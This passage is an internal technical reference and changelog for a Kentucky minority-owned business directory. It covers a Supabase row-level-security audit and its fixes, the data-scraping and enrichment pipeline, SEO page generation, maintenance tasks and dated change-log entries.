| `businesses` | Allow public insert | INSERT | — | **yes** — inject businesses straight into the live directory, bypassing `submissions` and approval entirely |
| `businesses` | Allow public select | SELECT | `true` | intended — the directory listing |
| `businesses` | Allow public update | UPDATE | `true` | **yes** — rewrite all 1,443 records |
| `submissions` | Allow public insert on submissions | INSERT | — | intended — the public forms |
| `submissions` | Allow public select on submissions | SELECT | `true` | **yes** — read every submitter name and email |
| `submissions` | Allow public update on submissions | UPDATE | `true` | **yes** — alter the moderation queue |

**There were no DELETE policies.** RLS is enabled on both tables (`relrowsecurity = true`, verified), so DELETE was denied on real rows despite the grant. `TRUNCATE` does bypass RLS, but PostgREST exposes no way to invoke it.

A probe using `?id=eq.-1` to test DELETE returned `204` and was initially misread as "permitted". It is not a valid test: a filter matching zero rows affects zero rows, so nothing violates the policy and the request succeeds regardless. **For UPDATE and DELETE, a zero-row filter proves the grant exists, not that the policy allows it.** To test a policy you need a filter that matches a real row, or read `pg_policy` directly. Reading `submissions` was a valid test only because it returned actual rows.

Four genuine holes. **Both fixes applied and verified 2026-07-29:** `restrict_anon_grants.sql` (grants) and `drop_permissive_policies.sql` (policies).

End state — correct at both gates independently, so neither is load-bearing alone:

| gate | `businesses` | `submissions` |
|---|---|---|
| GRANT | `SELECT` only | `INSERT` only |
| POLICY | "Allow public select" (`r`) | "Allow public insert on submissions" (`a`) |

That pairing is the point: with no permissive policy left, accidentally re-granting a privilege cannot reopen anything on its own — and vice versa. Post-fix live checks: directory `SELECT` 200, `search_businesses` returns `total_count=1443`, `suggest_search` returns results, `submissions` INSERT permission intact.

Note `relforcerowsecurity = false` on both tables. That is expected and harmless — it only governs whether RLS applies to the table *owner* (`postgres`), and the service role bypasses RLS regardless.

### Why the public write access existed — pipeline scripts and the duplicate SUPABASE_KEY

It was not an oversight, it was **load-bearing**, which is why it survived review: removing it appeared to break things.

`enrich.py`, `enrich_submissions.py`, `maintain.py` and `upload_to_supabase.py` all write to `businesses` and all read `os.getenv("SUPABASE_KEY")`. `.env` defined `SUPABASE_KEY` **twice** — once `sb_secret_…`, once `sb_publishable_…`. **dotenv keeps only the last occurrence**, so they silently received the *publishable* key, and their writes only worked because anon held table-wide INSERT/UPDATE grants.

The scripts' docstrings contradicted each other on the same variable:

- `upload_to_supabase.py`: "the service role key, NOT the read-only publishable key"
- `enrich.py`: "publishable key is fine (read + update under your RLS)"

The duplicate `.env` entry looks like the value being swapped by hand depending on which script was being run.

**Fixed July 2026:** all four now read `SUPABASE_SERVICE_ROLE_KEY` explicitly and `raise SystemExit` with a clear message if it is absent, so a missing key fails loudly instead of silently falling back to a key that cannot write. Read-only scripts (`scrape.py`, `prepare.py`, `discover_categories.py`) still use `SUPABASE_KEY` (publishable), which is correct.

**Delete the stale `SUPABASE_KEY=sb_secret_…` line from `.env`.** Nothing reads `SUPABASE_KEY` for writes any more, so it is now only a tripwire.

**The rule: never share one env var name between a privileged and an unprivileged key.** Name them for the privilege level, not the service. And when an over-broad permission looks deliberate, find what depends on it before assuming it is intentional — here the dependency was a variable-naming bug.

### Legacy notes

The `submissions` table also has RLS. If you hit permission errors:
- Public users reading `businesses` → SELECT policy required
- Form submissions posting to `submissions` → INSERT policy required
- Admin approving submissions and inserting into `businesses` → INSERT policy on `businesses` required
- Admin marking submissions approved/rejected → UPDATE policy on `submissions` required

---

## 12. Business SEO Pages

Static per-business HTML pages are generated by `generate-business-pages.js` and live in the `/businesses/` directory. These pages are committed to the repo and deployed via GitHub Pages.

**Script location:** `generate-business-pages.js` (repo root)
**Output directory:** `/businesses/` (committed to repo)
**Run command:**
```bash
node generate-business-pages.js
```

**What the script does:**
1. Queries Supabase for all businesses (paginated — handles 1,000+ records correctly)
2. Writes a static HTML file to `/businesses/{slug}.html` for each business
3. Writes `/businesses/sitemap.xml` listing every business page plus `index.html` and `about.html`

**Slugify logic:** business names are lowercased, non-alphanumeric characters replaced with hyphens, leading/trailing hyphens stripped. Example: "Joe's Plumbing LLC" → `joes-plumbing-llc`.

**Each business page includes:**
- Business name, favicon (Google Favicon API if website exists), status badge (Active/Inactive/No Website), industry
- Ownership tags (minority_type, comma-separated) in gold
- Certification tags (certification_type, comma-separated) in purple — Unknown and Not Certified filtered out of display
- Contact section: address (links to Google Maps), phone (tap-to-call link), website, Kentucky-based flag
- Services & Products description where available
- CTA linking back to `index.html?search=BusinessName` and to the full directory
- Canonical URL and Open Graph meta tags for SEO

**Sitemap:** `/businesses/sitemap.xml` lists every business page plus `index.html` and `about.html`. First submitted to Google Search Console June 24, 2026 (1,266 pages discovered, Status: Success). Regenerated June 2026 after dedupe and enrichment. **Current count: 2,066** pages, matching the live table exactly (verified 2026-07-30). The 1,794 figure here was stale by a month -- the out-of-state purge had dropped it.
Submit sitemap at: `https://search.google.com/search-console`
Sitemap URL: `https://thepeoplesledger.net/businesses/sitemap.xml`

**Maintenance frequency:** Regenerate after each quarterly data refresh (after new records are uploaded and categorized). This is the final step in the quarterly pipeline.

**After running:**
```bash
git add businesses/
git commit -m "Regenerate business SEO pages"
git push
```

**Node version note:** Script uses native `fetch` (Node 18+). If running an older Node version, install `node-fetch` and require it at the top of the script.

---

## 13. Maintenance Schedule

| Task | Command | Frequency |
|---|---|---|
| Add new businesses | `python pipeline/scrape.py` | Quarterly |
| Prepare (filter + dedupe) | `python pipeline/prepare.py` | After each scrape |
| Upload approved rows | `python pipeline/upload_to_supabase.py` | After review |
| Enrich (industry + services) | `python pipeline/enrich.py` | After upload |
| Dedupe the live table | `python pipeline/dedupe_live.py` (dry-run first, then `--apply`) | As needed |
| Regenerate SEO pages | `node generate-business-pages.js` | After upload (quarterly) |
| Refresh link statuses | `python pipeline/maintain.py` | Monthly |
| Fix buyblack URLs | `python pipeline/maintain.py --buyblack` | As needed |
| Back up the database | `python backup_supabase.py` | Daily (scheduled) + before any schema/RLS/grant change |
| Reconcile certification lists | **Manual.** Intake: drop downloads into `Minority_Biz_Database_Project/Spreadsheets/<certifier>/`, run notebook cells 2 and 4. The match-against-live-table step is not automated — see Section 6a | As agencies refresh |

---

## 14. Known Limitations

- `minority_type` and `certification_type` are comma-separated strings, not normalized. Future refactor would use junction tables.
- **Five `minority_type` values are not filterable** (measured 2026-07-29). index.html offers exactly nine `data-type` pills; these values exist in the data and match none of them, so those businesses cannot be reached by the ownership filter:

  | rows | value | disposition |
  |---|---|---|
  | 283 | `Minority-Owned (general)` | either add a pill or re-classify — this is 20% of the directory |
  | 17 | `Minority-Owned` | inconsistent spelling of the above; fold together |
  | 1 | `Family-Owned` | not an ownership category. Legacy orphan — no code path produces it (the scraper has no `family` detection and the form has no such checkbox), so it predates the current form or was hand-entered |
  | 1 | `Service-Disabled Veteran-Owned` | fold into `Veteran-Owned, Disability-Owned` |
  | 1 | `Disabled Veteran-Owned` | same |

  **The rule when adding a scraper search term: tag it with one of the nine existing pill values.** A new `minority_type` string without a matching pill in index.html produces unfilterable rows, which is how the 283 got there.
- Ownership detection in `scrape.py` works by source: Google Maps results are kept only when Google's own self-identified ownership attribute is present and are tagged from that attribute; organic and social results are tagged from ownership language in the page text. Badges and images are not read. This is the fix for the early bug where chains and same-name businesses were mislabeled from the search query.
- The national certification directories (NMSDC, WBENC, NGLCC) are membership-gated paid databases aimed at B2B procurement, not a consumer directory, and scraping them is ToS-risky. Selenium was evaluated and deliberately not added. Free JS-rendered directories are instead handled by finding their JSON endpoint and adding it to `DIRECTORY_API_ENDPOINTS`.
- This is not a substitute for certified MBE data for procurement compliance.
- The KY Transportation Cabinet and KY Finance & Administration Cabinet no longer include minority type fields in exports. The Louisville HRC database still does — it includes both `Ethnicity` and `Certification Type` columns and should be downloaded and merged on each quarterly data refresh (lane 2).

---

## 15. Key Differences from CandidateVoice

Claude works on both projects. These are easy to confuse — keep them straight:

| | CandidateVoice | The People's Ledger |
|---|---|---|
| Supabase project | lawteswyjpkovzagnshn | ursmecdpgtqckacyhnko |
| Public table | `reviews` | `businesses` |
| Submission table | `submissions` | `submissions` |
| Search method | Direct REST query | RPC functions (`search_businesses`) |
| Moderation | Auto-applies on approve | New records auto-insert; updates require manual DB edit |
| Design | Light, blue/orange | Dark, black/gold |
| Font | Inter | Michroma (display), Arial (body) |
| Industry pills | Dynamic from DB | Hardcoded in HTML |
| Score system | Yes (PostgreSQL trigger) | No |
| Python scripts | No | Yes — full data pipeline |
| SEO pages | `/employers/` via `generate-employer-pages.js` | `/businesses/` via `generate-business-pages.js` |

---

## 17. Keeping This Document Current

This document is only useful if it reflects what actually happened. After any session where something significant is built, broken, fixed, or decided, update this file and commit it.

**Triggers for updating this document:**
- A new feature, script, or page type is added
- A bug is found and fixed
- A known-bad approach is attempted and reverted
- An architectural decision is made (RLS changes, schema changes, new tables)
- A new file is added to the repo

**Commit it like any other file:**
```bash
git add docs/PeoplesLedger_Technical_Reference.md
git commit -m "Update technical reference"
git push
```

The version on GitHub is the source of truth. If your local copy and the repo diverge, the repo wins.

**Before pushing any update to the live site**, always test locally first: run `python -m http.server 8080` from the repo root, open `http://localhost:8080/[changed-file].html`, verify visually at desktop and mobile width, and check browser console (F12) for errors. No exceptions.

---

## 18. Checklist Before Making Changes

- [ ] Am I in the right project? Confirm Supabase URL starts with `ursmecdpgtqckacyhnko`
- [ ] Does this change affect the search RPC? If so, update the function in Supabase, not just the HTML
- [ ] Does the change add a new industry? Add it to both the DB categorization script AND the HTML filter pills
- [ ] Does the change affect the `businesses` schema? Update RPC functions too
- [ ] Does the change affect the submission flow? Test both "Add a Business" and "Submit a Correction" tabs
- [ ] Does the change affect the admin approval flow? Remember that update submissions require manual DB edits
- [ ] Is admin.html being pushed to GitHub? (It should never be — it's gitignored)
- [ ] Is `.env` being pushed to GitHub? (It should never be — it's gitignored)
- [ ] Does a Python script need to be updated? Test with a small batch before running on the full ~1,443 records

---

## 19. The Scraper (pipeline/scrape.py)

The web-discovery engine for lane 1. It writes to `data/`, and its output is consumed by `pipeline/prepare.py` (which merges the old triage and clean steps). The CSV is a 6-column schema; `prepare.py` adds the Status, Kentucky Based, and Disposition columns downstream.

### What it does

- Runs a SerpApi Google Maps phase that pulls structured business name, address, phone, and website with no page fetch and no Claude call. Ownership type comes from Google's self-identified ownership attribute on the result, never from the search query (see caveats).
- Switches extraction from Sonnet to Haiku (`claude-haiku-4-5`). Same JSON extraction job, much lower cost per record.
- Stops truncating long pages at 6000 characters. Pages that are long and carry multiple ownership signals are treated as roundups, chunked, and extracted in full.
- Keeps internal directory profile links (for example `/directory/business/123`), not only outbound links. Deep-link discovery now reads the full page including nav, header, and footer, where About and Contact links usually live.
- Adds an optional config slot for JSON or XHR directory endpoints (`DIRECTORY_API_ENDPOINTS`) so the JS-rendered directories that return nothing to plain requests can be read directly once their data endpoint is found in browser devtools. Empty by default, with a worked example in comments.
- Fixes the domain skip logic to parse the host and match exact or suffix domains, so valid sites are no longer dropped by accidental substring matches.
- Caches fetched HTML and Claude extractions on disk, so re-runs skip the fetch and skip re-paying for unchanged pages.

### Statewide coverage

`STATEWIDE_CITIES` spans every region of Kentucky (Louisville, Lexington, Bowling Green, Owensboro, Covington, Florence, Georgetown, Richmond, Elizabethtown, Nicholasville, Hopkinsville, Frankfort, Paducah, Henderson, Ashland, Murray, Somerset, Madisonville, London, Pikeville, Danville, and Winchester). Both the Maps and organic phases run across this list. Trim the list to cut cost, extend it for finer coverage.

### Instagram and Facebook

Those two domains are intentionally not skipped. Social pages are read through their og: meta tags, which carry the business name and bio even on a partial fetch. With `INCLUDE_SOCIAL_SEARCHES` on, the script also runs `site:instagram.com` and `site:facebook.com` searches per ownership term to surface profiles directly. Social fetches are less reliable than the site search path because the platforms increasingly block logged-out requests, so treat the site search results as the primary social channel.

### SerpApi budget

A full fresh statewide run is roughly 690 SerpApi searches (about 330 Maps, 330 organic, 30 social). The free tier is 100 per month, so a full statewide run needs a paid plan. The script prints the projected count at startup before any search runs. Directory page fetches do not use SerpApi.

### Resume behavior

`data/scraper_progress.json` records exactly which Maps searches, directory harvests, organic searches, and URL scans have completed. If any phase fails, fix the problem and re-run. The script skips finished work, including already-paid SerpApi searches, and resumes where it stopped. Business rows are always written to the checkpoint CSV before a unit of work is marked done, so a crash never loses data it claimed to finish. To force a full fresh run, delete `data/scraper_progress.json`.

### Skipping businesses already in the directory

With `SKIP_KNOWN_BUSINESSES` on (the default), the scraper reads the existing `businesses` table from Supabase at startup and uses it to avoid re-work. It skips scanning any URL whose domain is already a known business website, which saves both the page fetch and the Claude extraction for that page. It also drops exact name plus website matches from the output, so the v2 CSV is a clean list of new candidates rather than a re-run of what you already have. Social hosts are never blanket-skipped, only the exact known profile URL, so a new Instagram business on the same platform still gets scanned. Fuzzy near-duplicate matching is deliberately left to `prepare.py`, which already handles it with rapidfuzz, so the scraper never risks dropping a genuinely new business on a name coincidence.

This needs read access to Supabase. Add to `.env`:

```
SUPABASE_URL=https://ursmecdpgtqckacyhnko.supabase.co
SUPABASE_KEY=<the publishable key already used in index.html>
```

The publishable key allows public reads under the existing RLS SELECT policy, so this is the same access level the live site already uses. If the keys are absent, the scraper prints a notice and proceeds without the optimization. The run ends with a count of how many URLs were skipped as already in the directory.

### Output files

| File | Purpose |
|---|---|
| `data/businesses_scraped.csv` | Main result, 6-column schema, consumed by prepare.py |
| `data/businesses_scraped_sources.csv` | Audit-only log of where each row came from (google_maps, organic, social, directory_api). Does not enter the pipeline. |
| `data/businesses_scraped_checkpoint.csv` | Rolling save during the run |
| `data/scraper_progress.json` | Phase and step resume state |
| `data/cache/` | Cached HTML, Maps responses, and extractions |

### SerpApi limits and clean halting

SerpApi calls distinguish a real failure from a genuine empty result. A quota-exhausted, auth, or persistent rate-limit error halts the run cleanly and does not mark the failed query done, so re-running resumes exactly where it stopped. A genuine no-results response is treated as empty and the run continues. `MAX_SEARCHES_PER_RUN` (default 1500) is a hard per-run ceiling that makes a runaway loop impossible; it is per-invocation, separate from the monthly plan limit. A full statewide pass is about 690 searches. Plan note: the per-hour throughput matters as much as the monthly total. On plans at or below 200 searches/hour, the default 3 to 5 second pacing exceeds the hourly cap and will trigger rate limits, so either raise the delay or run in smaller batches; plans at 1000/hour and above clear the default pace comfortably.

### Caveats to check before uploading

- Maps results are kept only when Google's own self-identified ownership attribute is present in the result, and they are tagged from that attribute, not from the search query. This is the fix for the v2 first-run problem where chains and popular nearby businesses (QDOBA, Walmart, anything with "Black" in the name) were being mislabeled. Coverage depends on owners having set the attribute, so if a run keeps very few Maps businesses, attribute coverage is thin and you can set MAPS_VERIFY_LEADS_VIA_WEBSITE to True, which sends attribute-less Maps results with a website into the Phase 4 evidence check rather than trusting them. Raw Maps responses are cached under data/cache/maps so re-runs and detection tweaks cost no SerpApi searches.
- The Google Maps response shape on SerpApi shifts occasionally. If `local_results` comes back empty, verify the engine parameters against current SerpApi docs.
- Haiku is the extraction model. If ownership-type judgment proves unreliable on some sources, route only those to Sonnet.
---

## 19a. Pipeline ordering — filter at intake, not after

**The governing rule: every cheap filter runs before every expensive step.** Violating it is not a style problem, it is money and hours. Measured on the July 2026 cycle before the fix: **906 rows were fetched and Claude-extracted, written to CSV, then discarded** by `prepare.py` — 800 already in the directory, 83 out-of-state, 23 chains.

Three things caused it, all now fixed:

**1. `scrape.py` had no chain filter and no state filter at all.** It does now, in `add_business()` — the single function every business from every lane passes through, so it is the only place that can stop a doomed row cheaply. Maps results carry a structured address, so the state check is free.

**2. The two stages used different keys.** `scrape.py` matched known businesses on exact name **AND** website; `prepare.py` on normalised name **OR** website. Rows sailed through the strict check and were caught by the loose one two stages later. `scrape.py` now **imports** `is_chain`, `addr_state`, `_dedup_name` and `_norm_site` from `prepare.py`. Do not reimplement any of them — a second copy is how they drift apart, and the same lesson applies to the address resolver shared with `purge_out_of_state.py`.

**3. Scrape output was never consumed.** `businesses_scraped.csv` persisted forever, so `prepare.py` re-filtered it every run: it held 1,786 rows of which **116 were new**, and 800 of the "already in directory" drops were businesses uploaded in *previous* cycles. `upload_to_supabase.py` now archives the consumed files to `data/archive/<timestamp>/` after a successful upload. **`scraper_progress.json` is deliberately NOT archived** — it records which SerpApi searches have already been paid for, and deleting it means paying again.

Two related idempotency fixes:

- **`maintain.py`** re-fetched every website on every run; the July cycle checked all 2,066 twice in one day. It now skips anything checked within 25 days (`data/.maintain_state.json`, saved every 25 rows so a crash does not lose the run). `--all` forces a full sweep.
- **`generate-business-pages.js`** rewrote every file even when unchanged, so git saw 649 modified files for a run that changed 623 businesses. It now compares content first. A no-op run reports `0 written, 2066 unchanged` and leaves git clean.

---

## 20. Change Log

### July 2026 (30th) — Quarterly refresh published, and the pipeline reordered

**Published: 1,443 → 2,066.** 622 scraped rows plus one community submission. Every published row carries a Google owner-set ownership attribute; all 333 organic-lane rows were held (see Section 6b). Verified duplicate-free against the live table on three keys — exact name, website, fuzzy ≥88 — before upload. Enrichment: 622 industries, 620 services, 0 errors, 23 categories, no tags outside the nine filter pills.

**The scrape.** 32 terms × 34 cities (was 15 × 22), 2,240 SerpApi searches of a 5,000 monthly plan. Facebook and Instagram were **measured and then skipped**: a 300-URL random sample returned **0 businesses**, because Meta now answers unauthenticated fetches with HTTP 400 and no `og:` tags. They were 2,171 of 3,810 queued URLs — 57% of the scan queue for zero yield. `INCLUDE_SOCIAL_SEARCHES` is now False. 12 more junk hosts added to `SKIP_DOMAINS`. The remaining 1,639 URLs yielded 8.4%.

**`resolve_review.py` was discarding the answer.** It read only `organic_results`, picked a link, fetched that page and parsed HTML — while the same SerpApi response carried a `knowledge_graph` with the address, phone and real website already parsed. For "Mama's on Main" it chose an OpenTable booking page, found nothing, and left the row in the pile; the response contained `621 Main St, Covington, KY 41011`. It now reads the structured result first and falls back to fetch-and-parse only when there is none. The query also gained the service and a city hint derived from the aggregator domain (`thecovky.gov` → Covington), because `'"Olla" official website'` finds nothing while `'"Olla" Restaurant Covington Kentucky'` returns `ollacov.com` immediately. Review pile: **101 → 27** rows.

**Three silent data-quality bugs in `prepare.py`:** skip-known compared live names without stripping corporate suffixes while the in-file dedup stripped them, so `Braxton Brewing Co.` did not match a live `Braxton Brewing Company` (4 duplicates would have published); `addr_state` only detected another state from a two-letter code followed by a ZIP, so `Houston, Texas` and `Cincinnati, Ohio` passed as "unclear" (11 rows); and manual review drops were only remembered if you remembered `--commit-drops` **before** the next run overwrote the file — one forgotten flag discarded a whole review pass. All fixed; drops are now recorded automatically.

**`generate-business-pages.js` slug collisions.** `slugify(name)` was computed independently in the page template, the sitemap and the write loop, so two businesses sharing a name shared a URL: 2,066 businesses produced 2,064 files and a duplicate `<loc>`. Both cases were legitimate multi-location businesses. Fixed with one assigned slug per business; the first claimant keeps the bare form so no indexed URL moved.

**`maintain.py` crashed on a non-ASCII business name** — `UnicodeEncodeError` inside the `except` block that reports a fetch failure, killing a run at ~1,400 of 2,066 and leaving 660 rows unset. stdout/stderr are now forced to UTF-8. An error report must never be less printable than a success line.

**Pipeline reordered** — see Section 19a.

**Open:** 345 rows held in `businesses_prepared.csv` (200 unverified ownership, 128 organic, 17 flagged); 283 live `Minority-Owned (general)` rows exported to `data/live_minority_general_review.csv` for audit; the 12 Middle-Eastern/African businesses mislabeled `Latine`/`Asian` are still unfixed.

### July 2026 — Security hardening, backups, and a documentation failure

**Security (all applied and verified).** Four items, covered in detail in Sections 3 and 11: the admin.html XSS that could exfiltrate the service-role key from the pending queue; `anon` holding full write access to both tables; the pipeline scripts silently using the publishable key; and submitters being able to self-assert a state certification. See Section 11 for the grants/policies story and Section 6a for the certification one.

**Backups (new).** `backup_supabase.py` plus `backup_to_external.py` in the Candidate Voice repo, which mirrors **both** repos to `D:\Website_Backups\repos\` including gitignored files. Three Windows scheduled tasks: two DB backups at 9:00 AM, external-drive copy at 9:30 AM, all `StartWhenAvailable`. Before this there were no backups at all and the free tier provides none.

**Scraper expansion (uncommitted as of this writing).** `QUERY_TYPES` 15 → 32 and `STATEWIDE_CITIES` 22 → 34. The new terms target specific communities the generic ones under-surface (`korean owned business`, `nigerian owned business`, `trans owned business`, …); Northern Kentucky was added because it is the most diverse part of the state outside Louisville/Lexington and only Covington and Florence were represented. **Every new term maps to one of the nine existing filter pills** — no new taxonomy. Search space 690 → 2,240, so ~1,550 new searches; `MAX_SEARCHES_PER_RUN = 1500` means two runs. A partial run on the old config spent 417 searches and was stopped; `data/*.PRE-REFRESH-*` holds the pre-run progress and CSV.

**The documentation failure — read this before building anything.** A session read this entire document, then built a Lane 2 intake cleaner that already existed as `Minority_Biz_Database_Project/data_gather_.ipynb`, including re-deriving the cp1252 encoding and the preamble `skiprows` that cell 7 had already solved. Two causes:

1. The Section 3 file tree omitted that folder entirely, and the session treated the tree as the repo inventory.
2. The session searched `grep -r ... pipeline/` — one directory — instead of `grep -r ... .`.

Cause 2 is the real one. **A document describes intent and history; only the filesystem describes what exists.** This is the same lesson the July security work produced three separate times — "gitignored so the key is safe," "the policy is scoped to approved rows," "a read-only publishable key" — every one of them a documented model that did not match reality. Reading a doc is not looking.

**Rule going forward: run `git ls-files` and `ls -R` before proposing to build anything.** And when you add a file or folder to this repo, add it to the Section 3 tree in the same commit — a session will not go looking for what the tree does not list.



### June 2026 — Search rebuild, live dedupe, categorization cleanup

Three issues were reported: short/punctuated searches returned nothing, the table had duplicates, and categories were inconsistent so groceries were unfindable. All three were resolved.

**Search.** Rebuilt `search_businesses` and `suggest_search` (see Section 5). Root cause was whole-string `similarity()` diluting short queries plus literal substring matching that an apostrophe could break ("chois" vs "Choi's"). Fix normalizes punctuation on both sides, matches across name + services + industry, and uses `word_similarity()` for fuzzy fallback. These live in Supabase, not the HTML.

**Duplicates.** Built `pipeline/dedupe_live.py`. The live table had ~76 exact-name duplicate clusters, largely from the two intake lanes (web scrape vs certification reconcile) inserting the same business with differently formatted names and addresses. Removed 77 rows; survivors keep the best address and the real business website over directory placeholders. Row count went from a post-merge 1,871 down to 1,794. (The 1,264 in older docs predated the last merge.)

**Categorization.** The strays ("Construction", "Supplier", "Services", etc.) came from the certification/scrape lane, not enrich.py, whose prompt was already pinned to the 23 categories. Root problem: both enrich passes only touched NULL rows, so existing bad/thin/off-list values were never repaired. Fixed off-list labels with deterministic SQL renames, then reclassified the catch-all buckets (Retail and E-Commerce, Other Professional Services) — 127 of 328 rows moved, every grocery/market correctly landing in Food and Beverage. A handful of model misses were hand-corrected (Hopkinsville Black Market, MELANnaire Marketplace, El Papeleo). Then `--reenrich-groceries` rewrote grocery/market descriptions to lead with the searchable type, since fixing the category alone does not make the free-text word "groceries" match.

**Known follow-ups (not blocking):**
- Some certification-lane rows still carry raw NAICS-code text in `services_products` (e.g. First Choice Commercial Services). `--reenrich-services` pointed at those rows would clean them.
- A few `.0` ZIP artifacts (e.g. "47111.0") came from a ZIP-read-as-float in prepare.py or upload; worth fixing at the source so new rows stop arriving that way.
- `scrape.py` mismapped a column on at least one run (an ownership descriptor landed in an address field); watch for it.
- A phone-based near-duplicate scan could catch dupes that exact-name grouping misses (different punctuation in the name).

### June 2026: Out-of-state purge and address cleanup

Removed businesses whose address resolves to a US state other than Kentucky, and fixed the address noise that was hiding real Kentucky rows.

**Address cleanup (`pipeline/clean_addresses.py`).** Many rows carried a real Kentucky address with a trailing "N/A" (e.g. "Louisville, KY, N/A"). The parser only inspected the segment after the last comma, saw "N/A", found no state, and routed the row to manual review. The script strips delimited "N/A" tokens, tidies the leftover commas and double spaces, and sets the address to NULL when a cell was nothing but "N/A". Dry-run by default; `--apply` writes, backing up every change to `data/`.

**Out-of-state purge (`pipeline/purge_out_of_state.py`).** Deletes only rows whose address positively resolves to a non-KY state. Blank/NULL addresses are kept. Addresses present but undetermined are kept and written to a review CSV (never delete on uncertainty). State resolution runs in order: abbreviation-before-ZIP, trailing two-letter code, full state name, then ZIP-prefix fallback. Trailing country phrases ("United States", "USA") are stripped before detection, so KY rows carrying a country suffix are not mis-flagged. Service-role key required; refuses to run against any project other than `ursmecdpgtqckacyhnko`. Dry-run by default; `--apply` deletes and prints the regenerate-pages command. A `--delete-from <csv>` mode deletes the exact ids listed in a reviewed CSV; it backs up the full rows first and re-checks each address against the current parser, warning before it deletes anything that now resolves to Kentucky.

**Record count.** The purge dropped the verified count below the prior 1,794. Update Section 1, `README.md`, and any count references once the regenerate-and-push completes.

**Known follow-up (the durable fix, not yet built).** This purge removes out-of-state rows at maintenance time, but Lane 1 scraping is still not state-gated at intake, so a fresh quarterly scrape can re-introduce neighboring-state businesses (Indiana, Ohio). The permanent fix is a state filter in `prepare.py`: at the dispositioning step, drop any row whose address positively resolves to a non-KY state, ideally via a shared address-resolver module imported by both `prepare.py` and `purge_out_of_state.py` so the two never drift apart. Until that exists, the quarterly safeguard is to run `clean_addresses.py --apply` then `purge_out_of_state.py` after every refresh; `quarterly_refresh.sh` does this automatically through the dry run and leaves the delete as a manual confirm.

### June 2026: Category-seeded discovery lane (Lane 1b)

Built `pipeline/discover_categories.py` to find a segment the main scraper structurally misses. The main lane (scrape.py Phase 1) keeps a Maps result only when Google's self-identified ownership attribute is present, which is the fix that stopped chains from being mislabeled. The cost of that precision is that immigrant- and ethnic-owned retail (carnicerias, mercados, asian markets, halal grocers) is almost always dropped, because those owners rarely set the attribute. A consumer Google search for "hispanic grocery louisville" returns many such stores that are nowhere in the directory.

**How it works.** It imports `scrape.py` and composes its Maps engine, cache, evidence check, and skip-known logic rather than duplicating them. It searches Maps on category terms across `CATEGORY_CITIES`, then sorts each business into a tier: Tier A auto-accepts when Google's ownership attribute is present (tagged from the attribute); Tier B runs the business website through the same Phase 4 on-page evidence check and accepts only on an explicit ownership statement; Tier C is everything else, written to `category_review.csv` for manual confirmation. The governing rule: the category term decides what is surfaced, never what is tagged, so the lane cannot reintroduce the mislabeling the attribute gate prevents. Seed terms are split into a name_evident bucket (term implies a group, e.g. carniceria to Latine-Owned, used as a suggested type on the review row) and an ambiguous bucket (international grocery, halal market) whose suggested type is left blank on purpose.

**Modes.** `--triage` labels `category_review.csv` (Strong / Review / Ambiguous / Drop?) and sorts it, using accent-insensitive name corroboration plus a chain check, so the manual pass is fast. `--promote` moves rows the human marked Keep? = yes (with a confirmed type) into the passes file. `prepare.py` reads `businesses_scraped_categories.csv` and its sources file alongside the main scrape, so verified passes flow through the normal disposition, dedupe, and upload path; category-lane rows with no address are routed to "Needs review" rather than auto-approved.

**Key finding: Tier B is effectively zero for this segment.** Grocery and market websites carry hours and locations, not ownership statements, so the on-page evidence check almost never fires. The first pilot (21 terms x 6 cities, 126 SerpApi searches) produced 33 Tier A, 0 Tier B, and 434 Tier C. The practical consequence is that this lane is a manual-review generator, not an auto-verification engine. Triage made the 434 workable: 162 Strong (name and term agree, KY address), 167 Review (mostly drops, where generic butchers and chains that surfaced under an ethnic term sit), 96 Ambiguous, 9 likely chains.

**Scaling note and the values call.** Manual-review volume scales with city count; a full statewide pass would add roughly 800 to 1,000 more Tier C rows. Targeting dense-immigrant-retail metros beats a blind statewide sweep. And even a Strong row is corroboration, not proof of ownership, so the inclusion standard for keeping a name-only match is a values decision the operator sets; the script never auto-tags. Outputs (`businesses_scraped_categories.csv`, `category_review.csv`, `category_progress.json`) live in the gitignored `data/` folder.

### June 2026: Review-prep hardening + pipeline runner

A round of changes aimed at one goal: the review pile should contain only genuine, new, in-state, single-copy businesses, so no time is wasted reviewing things that should have been weeded out.

**prepare.py** gained three filters and a fix. Skip-known reads the live directory and drops any scraped row whose normalized name or website is already live (stops already-uploaded businesses, e.g. Good Brothers Pharmacy, from reappearing). A denylist (`data/denylist.csv`, populated by `prepare.py --commit-drops`) remembers businesses you deliberately rejected so they stop returning every run. A fuzzy pre-review dedup now runs across both Good to go and Needs review: it groups by normalized name with corporate suffixes stripped (so "Joe's BBQ" and "Joe's BBQ LLC" collapse), refuses to merge same-name rows whose street numbers conflict (two real locations stay separate, matching dedupe_live's rule), and a second pass merges fuzzy-close names that share a phone or website. Also fixed a crash where a no-website row produced an empty-string mask.

**resolve_review.py** now closes the listicle gap. When a Needs-review row's website is an aggregator (smileypete, the Tennessee Tribune, Voice of Black Cincinnati, buyblack, social, directories), is blank, or its domain does not match the business name, it searches SerpApi for the business's REAL site (reusing maintain.py's resolver pattern), then runs the existing about/contact address extraction on it. Kentucky businesses are promoted with the address filled and the bad URL corrected; out-of-state ones are dropped. `--no-serp` disables the lookup. The aggregator list is at the top of the file and easy to extend.

**discover_categories.py --triage** added a conservative American/European butcher filter (butcher, meat market, " meats", smokehouse, steer, etc., with no ethnic token) that routes generic meat markets to Drop?, and protects real ethnic butchers via a positive-token override. `--promote` refuses to promote a chain or butcher even if marked Keep=yes.

**ledger.py** (new) is a thin orchestrator so the routine path is one command per phase: `prep` (prepare + resolve_review, then stop for review), `publish` (upload + enrich --industries + enrich --services), `maintain` (dry-run health checks). Discovery and destructive cleaners stay separate on purpose.

**docs/order_of_operations.md** (new) maps the two phases: pre-upload cleaners run on the CSV (prepare, resolve_review); post-upload cleaners run on the live table (clean_addresses, purge_out_of_state, dedupe_live, maintain) and cannot run before review.

**Known data issue (open).** The first category-lane upload included ownership-label errors where Arabic, Persian, and African businesses were tagged Latine or Asian, because the taxonomy has no Middle Eastern or distinct African bucket. Affected live pages include al-madina-market, al-nahrain-supermarket, arabic-market, damascus-delicacies, sahara-international-grocery, parisa-international-supermarket, sam-s-halal-market-and-butcher, karibu-international-market, asafo-international-market, owensboro-international-african-market, safari-international-grocery-store, united-african-market. Fix minority_type in Supabase and regenerate those pages.
